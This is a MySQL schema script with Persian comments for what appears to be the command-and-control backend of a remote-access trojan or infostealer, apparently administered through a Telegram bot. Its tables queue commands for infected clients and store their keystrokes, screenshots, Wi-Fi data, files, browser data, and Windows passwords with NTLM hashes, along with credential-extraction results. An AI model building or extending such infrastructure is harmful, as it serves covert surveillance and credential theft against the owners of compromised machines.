CREATE DATABASE IF NOT EXISTS logger CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

USE logger;

-- جدول لاگ دستورات
CREATE TABLE IF NOT EXISTS command_logs (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    chat_id VARCHAR(50) NOT NULL,
    user_id VARCHAR(50) NOT NULL,
    command TEXT NOT NULL,
    response TEXT,
    created_at DATETIME NOT NULL,
    INDEX idx_chat_id (chat_id),
    INDEX idx_user_id (user_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول کاربران
CREATE TABLE IF NOT EXISTS users (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id VARCHAR(50) NOT NULL UNIQUE,
    is_active TINYINT(1) DEFAULT 1,
    is_admin TINYINT(1) DEFAULT 0,
    created_at DATETIME NOT NULL,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_user_id (user_id),
    INDEX idx_is_active (is_active)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول کلاینت‌ها
CREATE TABLE IF NOT EXISTS clients (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL UNIQUE,
    ip_address VARCHAR(45),
    is_online TINYINT(1) DEFAULT 0,
    last_seen DATETIME,
    created_at DATETIME NOT NULL,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_client_id (client_id),
    INDEX idx_ip_address (ip_address),
    INDEX idx_is_online (is_online),
    INDEX idx_last_seen (last_seen)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول دستورات کلاینت
CREATE TABLE IF NOT EXISTS client_commands (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id CHAR(32) NOT NULL,
    command TEXT NOT NULL,
    status ENUM('pending', 'completed', 'failed') DEFAULT 'pending',
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    completed_at DATETIME,
    result LONGTEXT,  -- ✅ تغییر از MEDIUMTEXT به LONGTEXT (تا 4GB)
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_status (client_id, status),
    INDEX idx_created_at (created_at),
    INDEX idx_status (status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;


-- جدول داده‌های کاربر
CREATE TABLE IF NOT EXISTS user_data (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    keystrokes MEDIUMTEXT,
    system_info MEDIUMTEXT,
    screenshot_path VARCHAR(255),
    created_at DATETIME NOT NULL,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول وضعیت VM
CREATE TABLE IF NOT EXISTS client_vm_status (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    vm_details TEXT,
    created_at DATETIME NOT NULL,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول داده‌های وای‌فای
CREATE TABLE IF NOT EXISTS client_wifi_data (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    wifi_data MEDIUMTEXT,
    created_at DATETIME NOT NULL,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول لاگ‌های کلاینت
CREATE TABLE IF NOT EXISTS client_logs (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    log_type VARCHAR(50) NOT NULL,
    message TEXT,
    created_at DATETIME NOT NULL,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_log_type (log_type),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول انتخاب کاربران
CREATE TABLE IF NOT EXISTS user_selections (
    user_id BIGINT NOT NULL,
    selected_client VARCHAR(255) NOT NULL,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (user_id),
    INDEX idx_updated_at (updated_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول برنامه‌های نصب شده
CREATE TABLE IF NOT EXISTS client_installed_programs (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    program_data MEDIUMTEXT,
    created_at DATETIME NOT NULL,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول فایل‌های آپلود شده (مشکل اصلی!)
CREATE TABLE IF NOT EXISTS client_files (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    filename VARCHAR(255) NOT NULL,
    file_path VARCHAR(500) NOT NULL,
    file_size BIGINT DEFAULT 0,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_created_at (created_at),
    INDEX idx_filename (filename)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول داده‌های کامل مرورگر
CREATE TABLE IF NOT EXISTS browser_data_comprehensive (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    chrome_data MEDIUMTEXT,
    firefox_data MEDIUMTEXT,
    edge_data MEDIUMTEXT,
    collected_at DATETIME NOT NULL,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_collected_at (collected_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول credential های ویندوز
CREATE TABLE IF NOT EXISTS client_windows_credentials (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    username VARCHAR(255),
    domain VARCHAR(255),
    password TEXT,
    ntlm_hash VARCHAR(65),
    sha1_hash VARCHAR(40),
    credential_type VARCHAR(50) DEFAULT 'msv',
    source VARCHAR(100),
    extracted_at DATETIME,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_username (username),
    INDEX idx_credential_type (credential_type),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- جدول وضعیت استخراج credential
CREATE TABLE IF NOT EXISTS client_credential_status (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    status ENUM('success', 'error', 'partial') DEFAULT 'success',
    credentials_found INT DEFAULT 0,
    hashes_found INT DEFAULT 0,
    passwords_found INT DEFAULT 0,
    message TEXT,
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id),
    INDEX idx_status (status),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- درج کاربر ادمین پیش‌فرض
-- توجه: این را با ADMIN_CHAT_ID واقعی خود جایگزین کنید
INSERT INTO users (user_id, is_active, is_admin, created_at)
VALUES ('YOUR_ADMIN_CHAT_ID', 1, 1, NOW())
ON DUPLICATE KEY UPDATE is_admin = 1, is_active = 1;